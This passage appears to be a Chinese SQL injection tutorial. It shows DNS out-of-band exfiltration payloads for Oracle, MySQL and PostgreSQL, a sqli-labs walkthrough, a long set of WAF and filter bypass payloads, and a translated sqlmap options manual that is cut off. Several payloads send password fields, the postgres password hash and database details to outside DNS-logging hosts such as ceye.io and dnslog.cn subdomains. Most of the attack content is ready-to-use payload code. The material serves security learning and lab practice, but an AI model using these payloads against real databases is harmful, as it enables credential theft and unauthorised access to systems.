- GET_HOST_ADDRES (用于检索特定主机的IP)


- UTL_HTTP.REQUEST (从给定的地址检索到的第1-2000字节的数据)

```sql
select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;
```

- DBMS_LDAP.INIT

```sql
select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
```

- HTTPURITYPE

```sql
select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
```

- UTL_INADDR.GET_HOST_ADDRESS

```sql
select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL; 
```



**Mysql**

**load_file** (读取文件内容并将其作为字符串返回)

`load_file()`函数的，它需要当前数据库用户有读权限，并且需要设置`secure_file_priv`。



**PostgreSQL**

COPY (用于在文件系统的文件和表之间拷贝数据)

```sql
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)FROM E\'\\\\'||query_result||E'.postgreSQL.nk40ci.ceye.io\\foobar.txt\'';
EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
```



### UNC

UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器.。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径

格式： \servername\sharename ，其中 servername 是服务器名，sharename 是共享资源的名称。
目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename



loadfile的路径使用UNC方式：

payload：

```sh
admin" union select load_file(concat('\\\\',(select hex(database())),'.g5ucgd.dnslog.cn\\test'))#
```

- `\\\\`转义后即为`\\`
- select hex(database())为需要的查询语句，用hex()是因为构造UNC时不能有特殊符号，转化一下更好用。
- `.g5ucgd.dnslog.cn\\test`转义后就变成了`.g5ucgd.dnslog.cn\test`，后面的test只是资源名字，随便起。

> 拼接起来后就成了`\\bvwa.g5ucgd.dnslog.cn\test`完全符合`UNC`的路径标准，解析后在`DNSlog`平台就能看到数据了。
>
> 注意，虽然使用`hex()`可以解决`UNC`特殊字符的问题，但是`UNC`的长度也不能超过`128`，所以自行看情况使用`hex()`



## 实验

以sql labs8为例

1.搜索dns.log在线软件，并get一个域名

![img](assets/20200210213043716.png)





2.在cmd中ping该域名，发现解析成功

![img](assets/20200210213416325.png)

![img](assets/20200210213511182.png)





3.在sql labs8中输入http://localhost/sqli-labs-master/Less-8/?id=1' and load_file("\\\\sss.cipv66.dnslog.cn\\xxx.txt") -- -，并执行

![img](assets/20200210214530864.png)





4.在dnslog上刷新查询，就可以看到sss就可以请求到了

![img](assets/20200210214714457.png)



5.在语句中修改为`http://localhost/sqli-labs-master/Less-8/?id=1' and load_file(concat("\\\\",version(),".cipv66.dnslog.cn\\xxx.txt") )-- -`，即可查到版本信息如下：

![img](assets/20200210215422187.png)



## 实际应用



在实际应用中，实现dns解析，有多种方法：

1. 使用burp suite 自带的Burp Collaborator client（方便好用，用于探测数据库服务器能否出网）
2. 搭建一个简易http服务器，如python服务器（有域名最好）
3. 使用开放平台的ceye.io或是自己搭建的dnslog服务器（网上有很多类型平台和文章，不再做介绍）
4. 使用sqlmap中的—dns-domain参数





#  Sql注入混淆与绕过

- [高级SQL注入：混淆和绕过](https://www.cnblogs.com/croot/p/3450262.html)
- [SQL注入防御与绕过的几种姿势](https://alisitaweb.github.io/2017/09/19/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BB%95%E8%BF%87%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/)



### `and` , `or`

PHP过滤代码：

```
preg_match('/(and|or)/i',$id)
```

**`/i`** 模式修饰符，表示忽略大小写

关键词**and,or**常被用做简单测试网站是否容存在注入。

过滤注入：

```
1 or 1 = 1    1 and 1 = 1
```

绕过注入：

```
1 || 1 = 1    1 && 1 = 1
```

------





### `and` , `or` , `union`

PHP过滤代码：

```
preg_match ('/(and|or|union)/i',$id)
```

关键词**union**通常被用来构造一个恶意的语句以从数据库中获取更多数据。

过滤注入：

```
union select user,password from users
```

绕过注入：

```
1 || (select  user  from  users  where  user_id = 1)='admin'
```

**`||`** 管道符后边的意思就是，从**users**表中查找 `user_id = 1` 的 **user** 数据是不是 **admin**

------



### `and` , `or` , `union` , `where`

PHP过滤代码：

```
preg_match ('/(and|or|union|where)/i',$id)
```

过滤注入：

```
1|| (select user from users where user_id = 1) = 'admin'
```

绕过注入：

```
1|| (select user from users limit 1)='admin'
```

**limit** 默认的初始行是从0行开始

`limit 1` 意思是 选取第一条数据。

------



### `and` , `or` , `union` , `where` , `limit`

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit)/i',$id)
```

关键词**union**通常被用来构造一个恶意的语句以从数据库中获取更多数据。

过滤注入：

```
1|| (select  user  from  users  limit 1) ='admin'
```

绕过注入：

```
1|| (select  user  from  users  group  by  user_id  having  user_id=1 ) = 'admin'
```

**GROUP BY** 语句通常与聚合函数(count, sum, avg, min, or max.) 等联合使用来得到一个或多个列的结果集，

**HAVING** 语句通常与**GROUP BY**语句联合使用，用来过滤由**GROUP BY**语句返回的记录集，

在这里，你可以这样理解，就是

**group by** 查找字段为 **user_id** 的所有数据，然后用 **having** 筛选 `user_id=1` 的那条数据。

------



### `and` , `or` , `union` , `where` , `limit` , `group by`

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit|group by)/i',$id)
```

关键词**union**通常被用来构造一个恶意的语句以从数据库中获取更多数据。

过滤注入：

```
1|| (select  user  from  users  group by  user_id  having  user_id  =1) ='admin'
```

绕过注入：

```
1|| (select  substr(group_concat(user_id),0,1) user  from  users  )=1
```

**`group_concat()`** 函数将组中的字符串连接成为具有各种选项的单个字符串。，

语法：group_concat(要连接的字段，排序字段，分隔符(默认是逗号))，

为了更好的理解 **`group_concat()`** 函数 ，我们可以简单测试一下 `group_concat(user_id)` 这句sql语句

首先一张表的数据为

![images](assets/gj01.png)

------

然后使用**`group_concat()`** 函数 输出一下看看

![images](assets/gj02.png)

可以看到已经将id全部输出，并且用逗号分隔开了

------

**`substr()`** 函数用来切割字符串。

语法：substr(string,start,length)

这条语句我们变换一下，

相当于这样：

```
substr('1,2,3,4,5',0,1)
```

`0` 意思是从第**0**位开始，`1`意思是 到第**1**位结束，

然后输出就是 **1**

整条sql语句最后就变成：

```
1|| (select  1)=1
```

`select 1` 也等于 **1** ，

最后就变成 `1|| 1=1` 条件为真。

------



### `and` , `or` , `union` , `where` , `limit` , `group by` , `select` ,`'`(分号)

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit|group by|select|\')/i',$id)
```

过滤注入：

```
1|| (select substr(group_concat(usr_id),1,1)user from users =1
```

绕过注入：

```
1|| user_id is not null
1||substr(user,1,1)=0x61
1||substr(user,1,1)=unhex(61)
```

首先还是之前那张表，来运行下sql语句看看，

![images](assets/gj03.png)

------

**`0x61`** 为16进制的a，最后就变成 `1||a=a`

**unhex()** 函数: 对十六进制数字转化为一个字符。

最后这条语句也是跟上面一样了。

------



### `and` , `or` , `union` , `where` , `limit` , `group by` , `select` ,`'`(分号) , `hex`

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit|group by|select|\'|hex)/i',$id)
```

过滤注入：

```
1||substr(user,1,1)=unhex(61)
```

绕过注入：

```
1||substr(user,1,1)=lower(conv(10,10,36))
```

**conv()** 函数是用于计算向量的卷积和多项式乘法。

不懂没关系，这篇文章讲的很详细，
`https://blog.csdn.net/geming2017/article/details/84256843`

虽然看懂了一些，但是太菜了，无法用脚本来计算，

于是本菜稍微去测试了一下，于是有了这个结果，

![images](assets/gj03.png)

------

![images](assets/gj04.png)

------

第一个数字可以控制输出的字符，第二个数字同样也可以，

第三个数字的话有兴趣的朋友可以自己去试试，

------

**lower()** 函数当前字符集映射为小写字母。

知道了函数的作用后面整个绕过语句就很好理解了，

------



### `and` , `or` , `union` , `where` , `limit` , `group by` , `select` ,`'`(分号) , `hex` , `substr`

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i',$id)
```

过滤注入：

```
1||substr(user,1,1)=lower(conv(10,10,36))
```

绕过注入：

```
1||lpad(user,7,1)
```

**lpad()** 字符串左填充函数。

语法： LPAD(str,len,padstr)

用字符串 padstr对 str进行左边填补直至它的**长度达到 len个字符长度**，

然后返回 str。如果 str的长度长于 **len**，那么它将被截除到 **len**个字符。

这里是判断`user` 中数据的长度是否为**7**，如果不是将用**1**来填充

简单测试，

![images](assets/gj05.png)

------



### `and` , `or` , `union` , `where` , `limit` , `group by` , `select` ,`'`(分号) , `hex` , `substr` , `white space`(英文空格，空白区间的意思)

PHP过滤代码：

```
preg_match ('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i',$id)
```

过滤注入：

```
1 || lpad(user,7,1)
```

绕过注入：

```
1%0b||%0blpad(user,7,1)
```

**`\s`** 是转移符，用以匹配任何空白字符，包括空格、制表符、换页符等等，

**%0b** 用来替换空白符。

替换空白符的方法还有 **两个空格代替一个空格，用Tab代替空格，%a0=空格**

另外，这些都可以用来替换空白符，
**`%20 %09 %0a %0b %0c %0d %a0 %00 /\**/ /\*!\*/`**

------



### 绕过正则表达式过滤

过滤注入： `1 or 1 = 1`

```
过滤注入： 1 union select 1,table_name from information_schema.tables where table_name='users'
过滤注入： 1 union select 1,table_name from information_schema.tables where table_name between 'a' and 'z'
过滤注入： 1 union select 1,table_name from information_schema.tables where table_name between char(97) and char(122)
绕过注入： 1 union select 1,table_name from information_schema.tables where table_name between 0x61 and 0x7a
绕过注入： 1 union select 1,table_name from information_schema.tables where table_name like 0x7573657273
```

------





### 常见混淆绕过技术

变换大小写，

某些WAF仅过滤小写的SQL关键词

正则表达式过滤：

```
preg_match ('/(union|sselect)/i',$id)
```

**`/g`** (全文查找出现的所有匹配字符)

绕过，例：

```
http://www.xxx.com/index.php?id=1+UnIoN/**/SeLecT/**/1,2,3-- 
```

------

替换关键词，

某些程序和WAF用preg_replace函数来去除所有的SQL关键词。

关键词 `union` 和 `select` 被去除，

绕过，例：

```
http://www.xxx.com/index.php?id=1+UNunionION+SEselectLECT+1,2,3--
```

------

某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用**`%0b`**来绕过。

绕过，例：

```
http://www.xxx.com/index.php?id=1+uni%0bon+se%0blect+1,2,3--
```

------

对于注释 **`/\**/`** 不能绕，那么我们用 **`%0b`** 代替 **`/\**/`** 。

例：

```
过滤： http://www.xxx.com/news/id/1/**/||/**/lpad(first_name,7,1).html
绕过： http://www.xxx.com/news/id/1%0b||%0blpad(first_name,7,1).html
```

------

**字符编码**

大多WAF将对程序的输入进行解码和过滤，

但是某些WAF仅对输入解码一次，那么双重加密就能绕过某些过滤。

例：

```
绕过： http://www.xxx.com/index.php?id=1%252f%252a*/union%252f%252a/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
```

简单说明一下，

**`%252f`** 两次URL解码后就 `/` 斜杠 ，

**`%252a`** 两次URL解码后就 `*` 星号 ，

其他的可以自己动手多去尝试。

------

对于某些过滤了 `NULL` 字符，和 **`'`** 单引号的，

可以使用例如下面的语句进行绕过

```
过滤： http://www.xxx.com/news/?/**/union/**/select?..
绕过： http://www.xxx.com/news/?/%2A%2A/union/%2A%2A/select?
绕过： http://www.xxx.com/news/?%2f**%2funion%2f**%2fselect
```



### 一些等效代替

参考：

- [CTF中几种通用的sql盲注手法和注入的一些tips](https://www.anquanke.com/post/id/160584#h3-13)

空格 <--> %20、%0a、%0b、*/**/*、 @tmp:=test

 **and** <--> **or** 

'=' <--> 'like' <--> 'in' --> 'regexp' <--> 'rlike' --> '>' <--> '<'



### 函数等效代替

字符串截断函数：left()、mid()、**substr**()、substring() 

取ascii码函数：**ord**()、ascii()





### Subquery returns more than 1 row的解决方法

产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1

如果我们这里的逗号被过滤了咋办？那就使用offset关键字：

```
limit 1 offset 1
```

如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：

```
(1) group_concat(使用的最多)
(2) <>筛选(不等于)
(3) not in
(4) DISTINCT
```

limit被过滤了还可以加限制条件

加限制条件，如：

select user from users group by user_id having user_id = 1 (user_id是表中的一个column)



### information_schema被过滤

 转载：

- [SQL注入基础整理及Tricks总结](https://www.anquanke.com/post/id/205376#h3-18)


innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中

除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema


### 表名已知字段名未知的注入

**join**注入得到列名：



**条件：有回显**（本地尝试了下貌似无法进行时间盲注，如果有大佬发现了方法可以指出来）



第一个列名：

```sql
select * from(select * from table1 a join (select * from table1)b)c
```



[![YUD2Kf.png](assets/YUD2Kf.png)](https://s1.ax1x.com/2020/05/12/YUD2Kf.png)



第二个列名：

```sql
select * from(select * from table1 a join (select * from table1)b using(balabala))c
```

[![YUD72q.png](assets/YUD72q.png)](https://s1.ax1x.com/2020/05/12/YUD72q.png)



第三个列名：

```sql
select * from(select * from table1 a join (select * from table1)b using(balabala,eihey))c
```

[![YUDjZF.png](assets/YUDjZF.png)](https://s1.ax1x.com/2020/05/12/YUDjZF.png)

以此类推……



**join 别名注入**（无列名注入）



**join利用别名直接注入：**

上述获取列名需要有回显，其实**不需要知道列名即可获取字段内容**：

采用别名：union select 1,(select b.2 from (select 1,2,3,4 union select * from table1)b limit 1,1),3



该语句即把(select 1,2,3,4 union select * from users)查询的结果作为表b，然后从表b的第1/2/3/4列查询结果

当然，1,2,3,4的数目要根据表的列名的数目来确定。

```sql
select * from table1 where '1'='' or if(ascii(substr((select b.2 from (select 1,2,3,4 union select * from table1)b limit 3,1),1,1))>1,sleep(3),0)
```



### 堆叠注入绕过select过滤

在堆叠注入的场景里，最常用的方法有两个：



**1.预编译：**

没错，预编译除了防御SQL注入以外还可以拿来执行SQL注入语句，可谓双刃剑：

```sql
id=1';Set @x=0x31;Prepare a from “select balabala from table1 where 1=?”;Execute a using @x;
```

或者：

```sql
set @x=0x73656c6563742062616c6162616c612066726f6d207461626c653120776865726520313d31;prepare a from @x;execute a;
```

上面一大串16进制是select balabala from table1 where 1=1的16进制形式



**2.Handler查询**

Handler是Mysql特有的轻量级查询语句，并未出现在SQL标准中，所以SQL Server等是没有Handler查询的。

Handler查询的用法：

handler table1 open as fuck;//打开句柄

handler fuck read first;//读所有字段第一条

handler fuck read next;//读所有字段下一条

……

handler fuck close;//关闭句柄



### PHP正则回溯绕过

PHP为防止正则表达式的DDos，给pcre设定了回溯次数上限，默认为100万次，超过这个上限则未匹配完，则直接返回False。

例如存在preg_match(“/union.+?select/ig”,input)的过滤正则，则我们可以通过构造

```sql
union/*100万个1*/select
```

即可绕过。



### PDO场景下的SQL注入

PDO最主要有下列三项设置：

```
PDO::ATTR_EMULATE_PREPARES

PDO::ATTR_ERRMODE

PDO::MYSQL_ATTR_MULTI_STATEMENTS
```

第一项为模拟预编译，如果为False，则不存在SQL注入；如果为True，则PDO并非真正的预编译，而是将输入统一转化为字符型，并转义特殊字符。这样如果是gbk编码则存在宽字节注入。



第二项为报错，如果设为True，可能会泄露一些信息。



第三项为多句执行，如果设为True，且第一项也为True，则会存在宽字节+堆叠注入的双重大漏。







****

# Sqlmap手册

由于Sqlmap 是常用工具之一，所以本篇的篇幅较长，详解一次所有参数。

## 1、Options（选项）



```sh
Usage: python sqlmap.py [options]

Options（选项）:

-h, --help Show basic help message and exit
## 展示帮助文档 参数

-hh Show advanced help message and exit
## 展示详细帮助文档参数

--version Show program's version number and exit
## 显示程序的版本号

-v VERBOSE Verbosity level: 0-6 (default 1)
## 详细级别：0-6（默认为1）
```

## 2、Target（目标）



```sh
Target（目标）:

At least one of these options has to be provided to define the target(s)

-d DIRECT Connection string for direct database connection
## 指定具体数据库

-u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")
## 目标URL

-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file
## 解析目标(s)从Burp或WebScarab代理日志文件

-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file
## 解析目标(s)从远程站点地图文件(.xml)

-m BULKFILE Scan multiple targets given in a textual file
## 扫描文本文件中给出的多个目标

-r REQUESTFILE Load HTTP request from a file
## 从本地文件加载HTTP请求 ，多用于post注入。

-g GOOGLEDORK Process Google dork results as target URLs
## 处理Google的结果作为目标URL。

-c CONFIGFILE Load options from a configuration INI file
## 从INI配置文件中加载选项。
```

## 3、Request（请求）



```sh
Request（请求）:

These options can be used to specify how to connect to the target URL
## 这些选项可以用来指定如何连接到目标URL。

--method=METHOD Force usage of given HTTP method (e.g. PUT)
## 强制使用给定的HTTP方法（e.g. PUT）

--data=DATA Data string to be sent through POST
## 通过POST发送的数据字符串

--param-del=PARA.. Character used for splitting parameter values
## 用于拆分参数值的字符

--cookie=COOKIE HTTP Cookie header value HTTP
## Cookie头的值

--cookie-del=COO.. Character used for splitting cookie values
## 用于分割Cookie值的字符

--load-cookies=L.. File containing cookies in Netscape/wget format
## 包含Netscape / wget格式的cookie的文件

--drop-set-cookie Ignore Set-Cookie header from response
## 从响应中忽略Set-Cookie头

--user-agent=AGENT HTTP User-Agent header value
## 指定 HTTP User - Agent头

--random-agent Use randomly selected HTTP User-Agent header value
##  使用随机选定的HTTP User - Agent头

--host=HOST HTTP Host header value
## HTTP主机头值

--referer=REFERER HTTP Referer header value
##  指定 HTTP Referer头

-H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
## 额外header

--headers=HEADERS Extra headers (e.g. "Accept-Language: fr\\nETag: 123")
## 额外header

--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP
## 认证类型(Basic, Digest, NTLM or PKI)

--auth-cred=AUTH.. HTTP authentication credentials (name:password)
##  HTTP认证凭证(name:password)

--auth-file=AUTH.. HTTP authentication PEM cert/private key file
## HTTP认证 PEM认证/私钥文件

--ignore-401 Ignore HTTP Error 401 (Unauthorized)
## 忽略HTTP错误401

--proxy=PROXY Use a proxy to connect to the target URL
## 使用代理连接到目标网址

--proxy-cred=PRO.. Proxy authentication credentials (name:password)
## 代理认证证书(name:password)

--proxy-file=PRO.. Load proxy list from a file
## 从文件中加载代理列表

--ignore-proxy Ignore system default proxy settings
## 忽略系统默认代理设置

--tor Use Tor anonymity network
## 使用Tor匿名网络

--tor-port=TORPORT Set Tor proxy port other than default
##  设置Tor代理端口而不是默认值

--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
## 设置Tor代理类型

--check-tor Check to see if Tor is used properly
## 检查Tor是否正确使用

--delay=DELAY Delay in seconds between each HTTP request
## 每个HTTP请求之间的延迟（秒）

--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)
## 秒超时连接前等待（默认30）

--retries=RETRIES Retries when the connection timeouts (default 3)
##  连接超时时重试（默认值3）

--randomize=RPARAM Randomly change value for given parameter(s)
## 随机更改给定参数的值(s)

--safe-url=SAFEURL URL address to visit frequently during testing
## 在测试期间频繁访问的URL地址

--safe-post=SAFE.. POST data to send to a safe URL
## POST数据发送到安全URL

--safe-req=SAFER.. Load safe HTTP request from a file
## 从文件加载安全HTTP请求

--safe-freq=SAFE.. Test requests between two visits to a given safe URL
## 在两次访问给定安全网址之间测试请求

--skip-urlencode Skip URL encoding of payload data
## 跳过有效载荷数据的URL编码

--csrf-token=CSR.. Parameter used to hold anti-CSRF token
## 参数用于保存anti-CSRF令牌

--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token
## 提取anti-CSRF URL地址访问令牌

--force-ssl Force usage of SSL/HTTPS
## 强制使用SSL /HTTPS

--hpp Use HTTP parameter pollution method
## 使用HTTP参数pollution的方法

--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码"import hashlib;id2=hashlib.md5(id).hexdigest()")
```

## 4、Optimization（优化）



```sh
Optimization（优化）:

These options can be used to optimize the performance of sqlmap
## 这些选项可用于优化sqlmap的性能

-o Turn on all optimization switches
## 开启所有优化开关

--predict-output Predict common queries output
## 预测常见的查询输出

--keep-alive Use persistent HTTP(s) connections
## 使用持久的HTTP（S）连接

--null-connection Retrieve page length without actual HTTP response body
## 从没有实际的HTTP响应体中检索页面长度

--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)
## 最大的HTTP（S）请求并发量（默认为1）
```

## 5、Injection（注入）



```sh
Injection（注入）:

These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts
##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

-p TESTPARAMETER Testable parameter(s)
## 可测试的参数（S）

--skip=SKIP Skip testing for given parameter(s)
## 跳过对给定参数的测试

--skip-static Skip testing parameters that not appear to be dynamic
## 跳过测试不显示为动态的参数

--param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses")
## 使用正则表达式排除参数进行测试（e.g. "ses"）

--dbms=DBMS Force back-end DBMS to this value
## 强制后端的DBMS为此值

--dbms-cred=DBMS.. DBMS authentication credentials (user:password)
## DBMS认证凭证(user:password)

--os=OS Force back-end DBMS operating system to this value
## 强制后端的DBMS操作系统为这个值

--invalid-bignum Use big numbers for invalidating values
## 使用大数字使值无效

--invalid-logical Use logical operations for invalidating values
## 使用逻辑操作使值无效

--invalid-string Use random strings for invalidating values
## 使用随机字符串使值无效

--no-cast Turn off payload casting mechanism
## 关闭有效载荷铸造机制

--no-escape Turn off string escaping mechanism
## 关闭字符串转义机制

--prefix=PREFIX Injection payload prefix string
## 注入payload字符串前缀

--suffix=SUFFIX Injection payload suffix string
## 注入payload字符串后缀

--tamper=TAMPER Use given script(s) for tampering injection data
## 使用给定的脚本（S）篡改注入数据
```

## 6、Detection（检测）



```sh
Detection（检测）:
These options can be used to customize the detection phase
## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

--level=LEVEL Level of tests to perform (1-5, default 1)
## 执行测试的等级（1-5，默认为1）

--risk=RISK Risk of tests to perform (1-3, default 1)
## 执行测试的风险（0-3，默认为1）

--string=STRING String to match when query is evaluated to True
##  查询时有效时在页面匹配字符串

--not-string=NOT.. String to match when query is evaluated to False
## 当查询求值为无效时匹配的字符串

--regexp=REGEXP Regexp to match when query is evaluated to True
## 查询时有效时在页面匹配正则表达式

--code=CODE HTTP code to match when query is evaluated to True
## 当查询求值为True时匹配的HTTP代码

--text-only Compare pages based only on the textual content
## 仅基于在文本内容比较网页

--titles Compare pages based only on their titles
##  仅根据他们的标题进行比较
```





## 7、Techniques（技巧）



```sh
Techniques（技巧）:
These options can be used to tweak testing of specific SQL injection techniques
## 这些选项可用于调整具体的SQL注入测试。

--technique=TECH SQL injection techniques to use (default "BEUSTQ")
## SQL 注入技术测试（默认BEUST）

--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)
##  DBMS响应的延迟时间（默认为5秒）

--union-cols=UCOLS Range of columns to test for UNION query SQL injection
##  定列范围用于测试UNION查询注入

--union-char=UCHAR Character to use for bruteforcing number of columns
##  用于暴力猜解列数的字符

--union-from=UFROM Table to use in FROM part of UNION query SQL injection
##  要在UNION查询SQL注入的FROM部分使用的表

--dns-domain=DNS.. Domain name used for DNS exfiltration attack
##  域名用于DNS漏出攻击

--second-order=S.. Resulting page URL searched for second-order response
## 生成页面的URL搜索为second-order响应
```

## 8、Fingerprint（指纹）



```sh
Fingerprint（指纹）:

-f, --fingerprint Perform an extensive DBMS version fingerprint
## 执行检查广泛的DBMS版本指纹
```

## 9、Enumeration（枚举）



```sh
Enumeration（枚举）:

These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements
## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。

-a, --all Retrieve everything
## 检索一切

-b, --banner Retrieve DBMS banner
## 检索数据库管理系统的标识

--current-user Retrieve DBMS current user
##  检索数据库管理系统的 标识

--current-db Retrieve DBMS current database
## 检索数据库管理系统当前数据库

-hostname Retrieve DBMS server hostname
## 检索数据库服务器的主机名

--is-dba Detect if the DBMS current user is DBA
## 检测DBMS当前用户是否DBA

--users Enumerate DBMS users
## 枚举数据库管理系统用户

--passwords Enumerate DBMS users password hashes
## 枚举数据库管理系统用户密码哈希

--privileges Enumerate DBMS users privileges
## 枚举数据库管理系统用户的权限

--roles Enumerate DBMS users roles
## 枚举数据库管理系统用户的角色

--dbs Enumerate DBMS databases
## 枚举数据库管理系统数据库

--tables Enumerate DBMS database tables
##  枚举的DBMS数据库中的表

--columns Enumerate DBMS database table columns
## 枚举DBMS数据库表列

--schema Enumerate DBMS schema
## 枚举数据库架构

--count Retrieve number of entries for table(s)
## 检索表的条目数

--dump Dump DBMS database table entries
##  转储数据库管理系统的数据库中的表项

--dump-all Dump all DBMS databases tables entries
## 转储数据库管理系统的数据库中的表项

--search Search column(s), table(s) and/or database name(s)
##  搜索列（S），表（S）和/或数据库名称（S）

--comments Retrieve DBMS comments
##  检索数据库的comments(注释、评论)

-D DB DBMS database to enumerate
## 要进行枚举的数据库名

-T TBL DBMS database table(s) to enumerate
##  要进行枚举的数据库表

-C COL DBMS database table column(s) to enumerate
## 要进行枚举的数据库列

-X EXCLUDECOL DBMS database table column(s) to not enumerate
## 要不进行枚举的数据库列

-U USER DBMS user to enumerate
## 用来进行枚举的数据库用户

--exclude-sysdbs Exclude DBMS system databases when enumerating tables
##  枚举表时排除系统数据库

--pivot-column=P.. Pivot column name
## 主列名称

--where=DUMPWHERE Use WHERE condition while table dumping
## 使用WHERE条件进行表转储

--start=LIMITSTART First query output entry to retrieve
##  第一个查询输出进入检索

--stop=LIMITSTOP Last query output entry to retrieve
## 最后查询的输出进入检索

--first=FIRSTCHAR First query output word character to retrieve
## 第一个查询输出字的字符检索

--last=LASTCHAR Last query output word character to retrieve
## 最后查询的输出字字符检索

--sql-query=QUERY SQL statement to be executed
## 要执行的SQL语句

--sql-shell Prompt for an interactive SQL shell
## 提示交互式SQL的shell

--sql-file=SQLFILE Execute SQL statements from given file(s)
## 从给定文件执行SQL语句
```

## 10、Brute Force（蛮力）



```sh
Brute force（蛮力）:

These options can be used to run brute force checks
## 这些选项可以被用来运行蛮力检查。

--common-tables Check existence of common tables
## 检查存在共同表

--common-columns Check existence of common columns
## 检查存在共同列
```

## 11、User-defined function injection（用户自定义函数注入）



```sh
User-defined function injection（用户自定义函数注入）:

These options can be used to create custom user-defined functions
## 这些选项可以用来创建用户自定义函数。

--udf-inject Inject custom user-defined functions
## 注入用户自定义函数

--shared-lib=SHLIB Local path of the shared library
## 共享库的本地路径
```

## 12、File system access（访问文件系统）



```sh
File system access（访问文件系统）:
These options can be used to access the back-end database management system underlying file system
## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。

--file-read=RFILE Read a file from the back-end DBMS file system
## 从后端的数据库管理系统文件系统读取文件

--file-write=WFILE Write a local file on the back-end DBMS file system
## 编辑后端的数据库管理系统文件系统上的本地文件

--file-dest=DFILE Back-end DBMS absolute filepath to write to
## 后端的数据库管理系统写入文件的绝对路径
```

## 13、Operating system access（操作系统访问）



```sh
Operating system access（操作系统访问）:

These options can be used to access the back-end database management system underlying operating system
## 这些选项可以用于访问后端数据库管理系统的底层操作系统。

--os-cmd=OSCMD Execute an operating system command
## 执行操作系统命令

--os-shell Prompt for an interactive operating system shell
##  交互式的操作系统的shell

--os-pwn Prompt for an OOB shell, Meterpreter or VNC
## 获取一个OOB shell，meterpreter或VNC

--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC
## 一键获取一个OOB shell，meterpreter或VNC

--os-bof Stored procedure buffer overflow exploitation
## 存储过程缓冲区溢出利用

--priv-esc Database process user privilege escalation
## 数据库进程用户权限提升

--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework
## 本地的安装路径

--tmp-path=TMPPATH Remote absolute path of temporary files directory
## 远程临时文件目录的绝对路径
```

## 14、Windows registry access（Windows注册表访问）



```sh
Windows registry access（Windows注册表访问）:

These options can be used to access the back-end database management system Windows registry
## 这些选项可以被用来访问后端数据库管理系统Windows注册表。

--reg-read Read a Windows registry key value
## 读一个Windows注册表项值

--reg-add Write a Windows registry key value data
## 写一个Windows注册表项值数据

--reg-del Delete a Windows registry key value
## 删除Windows注册表键值

--reg-key=REGKEY Windows registry key
## Windows注册表键

--reg-value=REGVAL Windows registry key value
##  Windows注册表项值

--reg-data=REGDATA Windows registry key value data
## Windows注册表键值数据

--reg-type=REGTYPE Windows registry key value type
## Windows注册表项值类型
```

## 15、General（一般）



```sh
General（一般）:

These options can be used to set some general working parameters
## 这些选项可以用来设置一些一般的工作参数。

-s SESSIONFILE Load session from a stored (.sqlite) file
## 保存和恢复检索会话文件的所有数据

-t TRAFFICFILE Log all HTTP traffic into a textual file
## 记录所有HTTP流量到一个文本文件中

--batch Never ask for user input, use the default behaviour
## 从不询问用户输入，使用所有默认配置。

--binary-fields=.. Result fields having binary values (e.g. "digest")
## 具有二进制值的结果字段

--charset=CHARSET Force character encoding used for data retrieval
